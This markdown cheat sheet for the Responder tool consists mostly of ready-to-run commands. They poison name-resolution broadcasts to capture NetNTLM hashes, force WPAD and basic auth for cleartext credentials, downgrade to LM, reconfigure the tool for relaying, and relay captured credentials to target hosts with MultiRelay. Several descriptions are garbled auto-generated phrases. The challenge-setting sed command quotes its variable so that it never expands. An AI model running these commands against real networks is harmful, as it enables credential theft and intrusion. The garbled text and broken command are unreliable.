# Responder

LLMNR / NBT-NS / mDNS poisoner. Sits on a network segment and answers broadcast name-resolution requests, then captures NetNTLMv1/v2 from clients that try to authenticate. Pair with `mitm6.md`, `ntlmrelayx.md`, `coercer.md`.

<!-- cheat
export interface
var interface = printf 'tun0\neth0\nwlan0\n' --- --query tun0 --header "Select interface"
-->

## Responder

### Run

Run run with Responder.

```sh title:"Responder Run Run"
sudo responder -I $interface
```
<!-- cheat
import interface
-->

### Analyze mode (passive)

Run analyze mode (passive) with Responder.

```sh title:"Responder Run Analyze Mode (passive)"
sudo responder -I $interface -A
```
<!-- cheat
import interface
-->

### With WPAD

Run Responder with WPAD.

```sh title:"Responder Run with WPAD"
sudo responder -I $interface --wpad
```
<!-- cheat
import interface
-->

### Force basic auth (cleartext)

Read force basic auth (cleartext) with Responder.

```sh title:"Responder Read Force Basic Auth (cleartext)"
sudo responder -I $interface --wpad -b
```
<!-- cheat
import interface
-->

### Force LM downgrade

Crack force LM downgrade with Responder.

```sh title:"Responder Crack Force LM Downgrade"
sudo responder -I $interface --lm
```
<!-- cheat
import interface
-->

## Responder.conf tweaks

### Disable SMB/HTTP for relay

Disable SMB/HTTP for relay with Responder.

```sh title:"Responder Disable SMB/HTTP for Relay"
sed -i 's/SMB = On/SMB = Off/g; s/HTTP = On/HTTP = Off/g' /usr/share/responder/Responder.conf
```
<!-- cheat -->

### Re-enable SMB/HTTP

Enable re enable SMB/HTTP with Responder.

```sh title:"Responder Enable Re Enable SMB/HTTP"
sed -i 's/SMB = Off/SMB = On/g; s/HTTP = Off/HTTP = On/g' /usr/share/responder/Responder.conf
```
<!-- cheat -->

### Set NTLM challenge

Set NTLM challenge with Responder.

```sh title:"Responder Set NTLM Challenge"
sed -i 's/Challenge =.*$/Challenge = $challenge/g' /usr/share/responder/Responder.conf
```
<!-- cheat
var challenge = printf '%s\n' '1122334455667788' --- --header 'Challenge'
-->

## Responder utilities

### MultiRelay specific users

Run MultiRelay specific users with Responder.

```sh title:"Responder Run MultiRelay Specific Users"
MultiRelay.py -t $rhost_ip -u $user1 $user2
```
<!-- cheat
import domain_ip
var user1
var user2
-->

### MultiRelay any user

Run MultiRelay any user with Responder.

```sh title:"Responder Run MultiRelay Any User"
MultiRelay.py -t $rhost_ip -u ALL
```
<!-- cheat
import domain_ip
-->

### RunFinger SMB signing check

Check RunFinger SMB signing check with Responder.

```sh title:"Responder Check RunFinger SMB Signing Check"
RunFinger.py -i $cidr
```
<!-- cheat
var cidr
-->
